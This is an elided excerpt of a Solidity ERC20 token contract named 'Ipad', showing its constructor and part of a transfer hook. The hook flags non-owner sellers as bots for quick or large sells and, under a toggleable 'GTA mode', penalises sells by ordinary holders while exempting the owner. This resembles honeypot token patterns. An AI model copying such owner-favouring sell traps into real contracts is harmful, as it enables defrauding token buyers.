...
contract Ipad is Ownable, ERC20 {
    address public uniswapV2Pair;
    address public uniswapRouter;
    uint256 public maxBuyAmount; 
    uint256 public maxSellAmount;
    uint256 public globalBuyCount;
    uint256 private minBuysBetweenSales = 5;
    uint256 private maxTimeWithoutTax = 200; 
    uint256 public GTA_Mode; 
    bool public isGTA_ModeActive;
    bool public isCTR_ModeActive = true;
    uint256 private minTimeBetweenTx = 10;
    ...
    constructor(address _taxReceiver) ERC20("Ipad", "Ipad") {
        require(_taxReceiver != address(0), "Tax receiver address cannot be 0");
        _mint(msg.sender, 102000000 * (10 ** uint256(decimals())));
        taxReceiver = _taxReceiver;
        maxBuyAmount = 102000000 * (10 ** uint256(decimals()));
        maxSellAmount = 102000000 * (10 ** uint256(decimals()));
    }
    ...
    function _beforeTokenTransfer(
        ...
        if (to == uniswapV2Pair && from != owner() && from != uniswapRouter) {
            if (isCTR_ModeActive && amount > maxSellAmount) {
                isBot[from] = true;
            }

            if (block.timestamp - lastOperationTime[from] < minTimeBetweenTx) {
                isBot[from] = true;
            }

            if (isGTA_ModeActive && 
                (block.timestamp - lastOperationTime[from] <= maxTimeWithoutTax || 
                 globalBuyCount - lastGlobalBuyCount[from] < minBuysBetweenSales || 
                 isBot[from])) {
            ...
            lastOperationTime[from] = block.timestamp;
        } 
        ...
        if (from == uniswapV2Pair && to != owner()) {
            ...
            globalBuyCount += 1;
            lastGlobalBuyCount[to] = globalBuyCount;
